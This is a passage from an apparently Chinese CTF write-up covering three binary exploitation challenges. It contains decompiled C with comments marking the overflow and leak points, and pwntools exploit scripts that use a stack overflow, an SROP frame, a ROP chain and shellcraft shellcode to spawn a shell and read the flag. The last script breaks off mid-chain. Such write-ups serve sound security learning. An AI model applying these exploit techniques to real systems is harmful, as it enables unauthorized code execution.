  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">s</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">[%sSir Alaric%s]: That's quite the reason why! And what is your age again?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="n">s</span> <span class="o">+</span> <span class="mi">272</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"&gt; "</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>          <span class="c1">// specialty  只有 0x10 空间 后面紧接着一个一个地址，填满后可以在 下面的输出泄露地址</span>
  <span class="p">{</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">s</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x118</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"[%sSir Alaric%s]: So, to sum things up: </span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"+------------------------------------------------------------------------+</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\t</span><span class="s">[Name]: %s</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\t</span><span class="s">[Reason to join]: %s</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\t</span><span class="s">[Age]: %ld</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\t</span><span class="s">[Specialty]: %s</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"+------------------------------------------------------------------------+</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span>
    <span class="n">s</span><span class="p">,</span>
    <span class="n">s</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="mh">0x22</span><span class="p">),</span>
    <span class="n">s</span> <span class="o">+</span> <span class="mi">280</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"[%sSir Alaric%s]: Please review and verify that your information is true and correct.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">1. Name      2. Reason</span><span class="se">\n</span><span class="s">3. Age       4. Specialty</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: And what are you good at: "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>    <span class="c1">// 可以更改 Specialty，但是这里就可以输入 0xFF ，明显溢出</span>
      <span class="p">{</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="n">s</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">280</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_36</span><span class="p">;</span>
      <span class="k">switch</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span>
            <span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: "</span><span class="p">,</span>
            <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span>
            <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
            <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
          <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">s</span> <span class="o">+</span> <span class="mi">272</span><span class="p">);</span>
          <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: Say your name again: "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
          <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
              <span class="k">break</span><span class="p">;</span>
            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: Specify the reason again please: "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
          <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
              <span class="k">break</span><span class="p">;</span>
            <span class="n">s</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="nl">default:</span>
<span class="nl">LABEL_36:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: Are you mocking me kid??</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">);</span>
          <span class="n">exit</span><span class="p">(</span><span class="mi">1312</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span>
        <span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: I suppose everything is correct now?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span>
        <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span>
        <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
        <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="n">s1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">"Yes"</span><span class="p">,</span> <span class="mi">3uLL</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;=</span> <span class="mi">1</span> <span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sSir Alaric%s]: We are ready to recruit you young lad!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span>
<span class="nf">s</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="n">jo</span> <span class="o">=</span> <span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x100</span>
<span class="nf">s</span><span class="p">(</span><span class="n">jo</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="n">age</span> <span class="o">=</span> <span class="mh">0xbeefbeef</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">age</span><span class="p">))</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="n">spec</span> <span class="o">=</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span>
<span class="nf">s</span><span class="p">(</span><span class="n">spec</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">bd</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">6992</span> <span class="o">+</span> <span class="mh">0x135C</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">bd</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#gdb.attach(io,gdbscript)
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Y</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x20</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bd</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">at:</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">Yes</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag.txt</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag.txt</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="laconic"><span class="me-2">laconic</span><a href="#laconic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<pre><code class="language-x86asm">.shellcode:0000000000043000 ; ===========================================================================
.shellcode:0000000000043000
.shellcode:0000000000043000 ; Segment type: Pure code
.shellcode:0000000000043000 ; Segment permissions: Read/Write/Execute
.shellcode:0000000000043000 _shellcode      segment byte public 'CODE' use64
.shellcode:0000000000043000                 assume cs:_shellcode
.shellcode:0000000000043000                 ;org 43000h
.shellcode:0000000000043000                 assume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing
.shellcode:0000000000043000
.shellcode:0000000000043000 ; =============== S U B R O U T I N E =======================================
.shellcode:0000000000043000
.shellcode:0000000000043000
.shellcode:0000000000043000 ; void start()
.shellcode:0000000000043000                 public _start
.shellcode:0000000000043000 _start          proc near               ; DATA XREF: LOAD:0000000000042018↑o
.shellcode:0000000000043000                                         ; LOAD:0000000000042088↑o
.shellcode:0000000000043000                 mov     rdi, 0          ; Alternative name is '_start'
.shellcode:0000000000043000                                         ; __start
.shellcode:0000000000043007                 mov     rsi, rsp
.shellcode:000000000004300A                 sub     rsi, 8
.shellcode:000000000004300E                 mov     rdx, 106h
.shellcode:0000000000043015                 syscall                 ; LINUX -
.shellcode:0000000000043017                 retn
.shellcode:0000000000043017 _start          endp
.shellcode:0000000000043017
.shellcode:0000000000043018 ; ---------------------------------------------------------------------------
.shellcode:0000000000043018                 pop     rax
.shellcode:0000000000043019                 retn
.shellcode:0000000000043019 _shellcode      ends
.shellcode:0000000000043019

####################################################
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
</code></pre>

<p>‍</p>

<p>RWX 段，栈溢出，SROP</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="nf">pause</span><span class="p">()</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xbeef</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x43018</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x43015</span><span class="p">)</span>

<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x043020</span>
<span class="n">sigframe</span> <span class="o">=</span> <span class="nc">SigreturnFrame</span><span class="p">()</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="p">.</span><span class="n">SYS_read</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">bss</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x100</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">bss</span>
<span class="n">sigframe</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x43015</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">[:</span><span class="mh">0x106</span><span class="p">])</span> 

<span class="nf">pause</span><span class="p">()</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">add rsp,0x100</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="crossbow"><span class="me-2">crossbow</span><a href="#crossbow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="n">target_dummy</span><span class="p">(){</span>
	<span class="p">...</span>
	<span class="p">...</span>
	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="n">v14</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span> <span class="c1">// 输入-2</span>
  	<span class="p">{</span>
		<span class="p">...</span>
  	<span class="p">}</span>
  	<span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
  	<span class="o">*</span><span class="n">v8</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="mi">128LL</span><span class="p">);</span> <span class="c1">// 覆盖 rsp 上的指针</span>
	<span class="p">...</span>
	<span class="p">...</span>
	<span class="n">fgets_unlocked</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">**</span><span class="p">)(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">a1</span><span class="p">),</span> <span class="mi">128</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_stdin_FILE</span><span class="p">);</span> <span class="c1">// 写ROP到返回地址上</span>
<span class="p">}</span>
<span class="c1">// return  leave </span>


<span class="kt">int</span> <span class="nf">training</span><span class="p">(){</span>
	<span class="p">...</span>
	<span class="kt">char</span> <span class="n">v13</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
	<span class="p">...</span>
	<span class="n">target_dummy</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>


<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">-2</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">rax</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span> <span class="c1"># pop rax ; ret
</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401d6c</span> <span class="c1"># pop rdi ; ret
</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0000000000401139</span> <span class="c1"># pop rdx ; ret
</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x000000000040566b</span> <span class="c1"># pop rsi ; ret
</span><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x4067ED</span>
<span class="n">target</span> <span class="o">=</span> <span class="mh">0x40d000</span>

<span class="n">pay</span>  <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1">#pay += p64(rax) + p64(0x0a)
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x040A320</span><span class="p">)</span>
<span class="c1">#pay += p64(rax) + p64(0x0)
